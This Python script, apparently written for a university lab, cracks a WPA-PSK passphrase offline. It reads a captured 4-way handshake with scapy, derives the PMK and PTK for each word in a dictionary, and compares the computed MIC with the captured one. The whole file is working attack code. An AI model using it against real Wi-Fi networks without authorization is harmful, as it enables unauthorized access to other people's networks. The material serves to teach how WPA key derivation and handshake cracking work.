import sys

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import pbkdf2
import hmac, hashlib

# Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
wpa = rdpcap("wpa_handshake.cap")
filename = "dict.txt"

if len(sys.argv) > 1:
    filename = sys.argv[1]

file = open(filename)
dictionary = file.read().split("\n")

print(dictionary)


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def calcMIC(wpa):
    # Important parameters for key derivation - some of them can be obtained from the pcap file
    # passPhrase  = "actuelle" #this is the passphrase of the WPA network
    A = "Pairwise key expansion"  # this string is used in the pseudo-random function and should never be modified
    ssid = wpa[0].info.decode()  # "SWI"
    APmac = a2b_hex(wpa[1].addr2.replace(":", ""))  # a2b_hex("cebcc8fdcab7") #MAC address of the AP
    Clientmac = a2b_hex(wpa[1].addr1.replace(":", ""))  # a2b_hex("0013efd015bd") #MAC address of the client

    # Authenticator and Supplicant Nonces
    ANonce = wpa[5].load[13:45]  # a2b_hex("90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91")
    SNonce = wpa[6].load[13:45]  # a2b_hex("7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577")

    # This is the MIC contained in the 4th frame of the 4-way handshake. I copied it by hand.
    # When trying to crack the WPA passphrase, we will compare it to our own MIC calculated using passphrases from a dictionary
    mic_to_test = b2a_hex(wpa[8].load[77:93])  # "36eef66540fa801ceee2fea9b7929b40"

    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)  # used in pseudo-random function

    # Take a good look at the contents of this variable. Compare it to the Wireshark last message of the 4-way handshake.
    # In particular, look at the last 16 bytes. Read "Important info" in the lab assignment for explanation
    data = bytes(wpa[8]['EAPOL'])[:93] + b'\x00' * 22

    ssid = str.encode(ssid)

    """
    print "original data:", "0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    print("our data:     ", data)
    """

    """
    print "\n\nValues used to derivate keys"
    print "============================"
    print "Passphrase: ",passPhrase,"\n"
    print "SSID: ",ssid,"\n"
    print "AP Mac: ",b2a_hex(APmac),"\n"
    print "CLient Mac: ",b2a_hex(Clientmac),"\n"
    print "AP Nonce: ",b2a_hex(ANonce),"\n"
    print "Client Nonce: ",b2a_hex(SNonce),"\n"
    """
    with open(filename) as dictionary:
        for passPhrase in dictionary:
            # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            passPhrase = str.encode(passPhrase)[:-1]
            pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

            # expand pmk to obtain PTK
            ptk = customPRF512(pmk, str.encode(A), B)

            # calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
            if int.from_bytes(wpa[5].load[0:1], byteorder='big') == 2:
                mic = hmac.new(ptk[0:16], data, hashlib.sha1)
            else:
                mic = hmac.new(ptk[0:16], data, hashlib.md5)

            # # the MIC for the authentication is actually truncated to 16 bytes (32 chars). SHA-1 is 20 bytes long.
            # MIC_hex_truncated = mic.hexdigest()[0:32]
            mic_digest = mic.hexdigest()[:-8]

            if mic_to_test.decode() == mic_digest:
                print("Found the passphrase : ", passPhrase)
                return True

        return False


# """
# 	print "\nResults of the key expansion"
# 	print "============================="
# 	print "PMK:\t\t",pmk,"\n"
# 	print "PTK:\t\t",b2a_hex(ptk),"\n"
# 	print "KCK:\t\t",KCK,"\n"
# 	print "KEK:\t\t",KEK,"\n"
# 	print "TK:\t\t",TK,"\n"
# 	print "MICK:\t\t",MICK,"\n"
# 	print "MIC:\t\t",MIC_hex_truncated,"\n"
# """

if not calcMIC(wpa):
    print("Passphrase not found")
